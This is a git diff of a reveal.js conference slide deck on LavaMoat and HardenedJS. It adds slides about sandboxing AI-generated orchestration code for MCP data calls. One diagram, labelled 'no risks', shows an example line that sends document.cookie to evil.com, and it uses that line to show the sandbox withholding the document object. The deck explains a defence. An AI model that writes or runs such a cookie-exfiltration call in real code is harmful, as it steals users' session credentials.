@@ -30,6 +30,10 @@
       font-size: 0.88em;
     }
 
+    #naugtur pre svg {
+      line-height: normal;
+    }
+
     #naugtur:before {
       content: 'naugtur.pl';
       position: fixed;
@@ -529,6 +533,8 @@ LavaMoat uses HardenedJS to provide security for JavaScript projects of today an
 
         ![](./ilus/botcont1.png)
       </section>
+
+     
       <section data-markdown>
         <textarea data-template>
           ### HardenedJS + AI
@@ -536,14 +542,113 @@ LavaMoat uses HardenedJS to provide security for JavaScript projects of today an
           > HardenedJS lets me put AI generated code anywhere I want and have confidence it won't mess up the rest of my app.
 
           ---
+
+          # 🦎 🧠
+          ## Thinking fast and slow
+
+          ---
+
+          ### Working with MCPs
+
+          - make multiple calls for data
+          - merge the data together
+
+          ---
+
+          ### MCP forces LLM to process <br>"in its head"
+
+          - why waste resources? 
+            - we can merge JSON without AI
+          - why risk hallucinating?
+
+        
+          ---
+
+          ### thinking slow
+
+          ```mermaid
+          graph LR
+            A[User Prompt] --> B((🧠 AI Agent))
+            B --> C[MCP Server 1]
+            B --> D[MCP Server 2]
+            B --> E[MCP Server 3]
+            C --> F[Data 1]
+            D --> G[Data 2]
+            E --> H[Data 3]
+            F --> BB(((🧠 AI Agent)))
+            G --> BB
+            H --> BB
+            BB --> I[Final Output]
+
+          ```
+          ---
+
+          #### LLMs are better at generating code than strict reasoning
+
+          ---
+
+          ### thinking fast and slow
+
+          ```mermaid
+          graph LR
+            A[User Prompt] --> B((🧠 AI Agent))
+            B --> C
+            B --> I[Final Output]
+            subgraph CODE[Orchestration Code Contained]
+              C["🦎\nfetchData1();\nfetchData2();\nfetchData3();\nd=mergeData(d1,d2,d3);\n_"] --> D1["rePrompt(d)"]
+
+              C --- Pf
+              C --- Pp
+
+              subgraph POW[Powers]
+                Pf{{fetch}} 
+                Pp{{prompt}}
+              end
+            end
+            
+            D1 --Yes it can loop--> B
+          ```
+          ---
+
+          ### no risks
+
+          ```mermaid
+          graph LR
+            A[User Prompt] --> B((🧠 AI Agent))
+            B --> C
+            C --> E{Error}
+            subgraph CODE[Orchestration Code Contained]
+              C["🦎\nfetch('evil.com/?c='+document.cookie)\n_"] 
+
+              C --- Pf
+              C -.-x Pp
+
+              subgraph POW[Powers]
+                Pf{{fetch}} 
+                Pp{{document}}
+              end
+            end
+            
+          ```
+
+          ---
+
+          ## Can even run inside a website
+
+          - HardenedJS sandboxed
+          - limited powers
+          - access to UI integration APIs
+
+          ---
+          
           ### Triangular strawberry arrangement
           # 🍓
           # 🍓🍓
+
         </textarea>
       </section>
-      <section data-markdown data-background="./ilus/botcont2.png">
+       <section data-markdown data-background="./ilus/botcont2.png">
         # What if...
-
 
       </section>
       <section data-markdown class="animateBot animateMany">
@@ -655,6 +760,9 @@ LavaMoat uses HardenedJS to provide security for JavaScript projects of today an
   <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/search/search.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/markdown/markdown.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/highlight/highlight.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/reveal.js-mermaid-plugin@2.3.0/plugin/mermaid/mermaid.js"></script>
+
+
 
 
   <script>
@@ -668,8 +776,11 @@ LavaMoat uses HardenedJS to provide security for JavaScript projects of today an
       mouseWheel: true,
 
       transition: 'concave', // none/fade/slide/convex/concave/zoom
+      mermaid: {
+        theme: "dark"
+      },
 
-      plugins: [RevealZoom, RevealNotes, RevealSearch, RevealMarkdown, RevealHighlight],
+      plugins: [RevealZoom, RevealNotes, RevealSearch, RevealMarkdown, RevealHighlight, RevealMermaid],
       // autoAnimateEasing: 'linear',
 
       // Parallax background image
